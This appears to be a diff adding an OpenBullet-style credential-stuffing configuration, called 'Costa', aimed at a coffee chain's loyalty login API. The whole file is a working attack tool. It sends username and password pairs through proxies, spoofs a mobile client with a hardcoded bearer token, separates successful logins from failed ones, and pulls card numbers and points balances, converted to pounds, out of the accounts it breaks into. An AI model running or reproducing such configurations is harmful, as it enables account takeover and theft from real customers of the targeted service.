@@ -1,0 +1,46 @@
+[SETTINGS]
+{
+  "Name": "Costa",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-02T19:24:31.821211+01:00",
+  "AdditionalInfo": "",
+  "Author": "Spaceman",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://costa-platform.com/loyalty/authenticate" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: okhttp/3.3.1" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Use-Costa-Headers: true" 
+  HEADER "X-Channel: O" 
+  HEADER "Authorization: bearer AQICAHjtWAoTJc/JFgaIUv/xL9XdQT1htaqVqDcbZ2F47Kfh9gHL5ZFnFUL8QXrvi4oTFCnmAAABPzCCATsGCSqGSIb3DQEHBqCCASwwggEoAgEAMIIBIQYJKoZIhvcNAQcBMB4GCWCGSAFlAwQBLjARBAxYCfOY1Sj8WE4ceOUCARCAgfMKqYK7rGMBPaxmkvQNQapWsRIxRuaeZEAkurbPluIZWYve/z8pjfC0z+KDAEx9a6dWxw2eQbHIf1o1GhysGYx/fUhyqDRrxgMr2q264Xs8s5UiTG3ruBMPE85fGE+1aMjdyTFc2OOB73J9DuG/Ju2Wl7ApimOweHtD6ZpPXxMrf/b/2PvFR//IPHnTlXCvJD8raPjwkXz/PXUofT5LGE4pLw1Xa1dCmMJq/3z/ERysPHtDa0cAkDIUjlKoVYhdvr1Tl8zS04X2WulSGMaDZot76O6wLvJew42t1VS8t47yyxxQEVTl2XxcdnRkpTzLKxKRsTQ=" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "details\": \"Wrong login or password" 
+  KEYCHAIN Success OR 
+    KEY "cardNumber\": \"" 
+PARSE "<SOURCE>" LR "cardNumber\": \"" "\"," -> CAP "Card Number : " 
+PARSE "<SOURCE>" LR "pointsBalance\": " "," -> CAP "Points : " 
+PARSE "<SOURCE>" LR "pointsBalance\": " "," -> VAR "Points" 
+FUNCTION Compute "<Points>/100" -> VAR "Balance1" 
+FUNCTION Constant "£<Balance1>" -> CAP "Balance : " 
